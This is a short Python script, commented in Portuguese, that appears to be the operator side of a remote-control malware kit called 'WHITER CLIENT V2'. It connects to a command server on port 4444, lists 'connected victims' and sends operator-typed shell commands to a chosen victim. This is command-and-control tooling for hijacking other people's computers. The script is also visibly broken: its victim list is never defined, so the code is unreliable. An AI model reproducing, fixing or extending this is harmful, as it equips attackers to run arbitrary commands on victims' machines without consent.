import socket
import threading

HOST = 'SEU_IP_AQUI'  # Substitua pelo IP do servidor
PORT = 4444

# Função para mostrar o banner
def banner():
    print("""
██╗    ██╗██╗  ██╗██╗████████╗███████╗██████╗     
██║    ██║██║  ██║██║╚══██╔══╝██╔════╝██╔══██╗    
██║ █╗ ██║███████║██║   ██║   █████╗  ██████╔╝    
██║███╗██║██╔══██║██║   ██║   ██╔══╝  ██╔══██╗    
╚███╔███╔╝██║  ██║██║   ██║   ███████╗██║  ██║    
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    
     W H I T E R   C L I E N T   V2
""")

# Função para listar vítimas conectadas
def listar_vitimas(clientes):
    print("\n[ VÍTIMAS CONECTADAS ]")
    for i, (conn, addr) in enumerate(clientes):
        print(f"{i+1} - {addr[0]}:{addr[1]}")

# Função para enviar comandos a uma vítima selecionada
def enviar_comando(cliente):
    comando = input("Comando > ")
    cliente.send(comando.encode())
    resposta = cliente.recv(4096).decode()
    print(resposta)

# Função para gerenciar o menu e interação com o servidor
def menu():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(s.recv(2048).decode())  # Banner do servidor

    while True:
        print("\n[ MENU ]")
        print("1 - Listar vítimas conectadas")
        print("2 - Enviar comando para vítima")
        print("3 - Sair")
        op = input("> ")

        if op == "1":
            listar_vitimas(clientes)
        elif op == "2":
            listar_vitimas(clientes)
            escolha = int(input("Escolha a vítima (número): ")) - 1
            enviar_comando(clientes[escolha][0])  # Envia o comando para a vítima selecionada
        elif op == "3":
            s.send(b"exit")
            break
        else:
            print("Opção inválida.")
    s.close()

banner()
menu()
